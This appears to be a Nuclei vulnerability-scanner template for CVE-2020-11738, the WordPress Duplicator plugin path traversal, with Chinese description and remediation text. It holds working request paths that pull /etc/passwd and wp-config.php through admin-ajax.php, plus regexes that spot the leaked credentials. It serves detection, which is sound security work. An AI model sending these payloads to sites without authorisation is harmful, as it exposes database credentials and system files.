id: CVE-2020-11738
info:
  name: WordPress Duplicator plugin Directory Traversal
  author:
  - l0ne1y
  tags:
  - cve
  - cve2020
  - wordpress
  - wp-plugin
  - lfi
  description: |-
    WordPress Plugin Snap Creek Duplicator和Duplicator Pro 路径遍历漏洞
    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。Snap Creek Duplicator是使用在其中的一个WordPress网站迁移插件。

    WordPress Snap Creek Duplicator 1.3.28之前版本和Duplicator Pro 3.8.7.1之前版本中存在路径遍历漏洞。攻击者可通过向duplicator_download或duplicator_init发送带有‘../’序列的‘file’文件参数利用该漏洞访问被限制的文件。
  reference:
  - https://www.tenable.com/blog/duplicator-wordpress-plugin-vulnerability-exploited-in-the-wild
  - https://snapcreek.com/duplicator/docs/changelog/?lite
  - https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
  - http://packetstormsecurity.com/files/160621/wordpress-duplicator-1.3.26-directory-traversal-file-read.html
  severity: high
  classification:
    cve-id:
    - cve-2020-11738
    cwe-id:
    - cwe-22
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    condition: and
    part: header
    regex:
    - File Transfer
    - application/octet-stream
    - attachment; filename="(wp-config\.php|passwd)"
  - type: regex
    condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - define\('DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)'
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php'
  method: GET
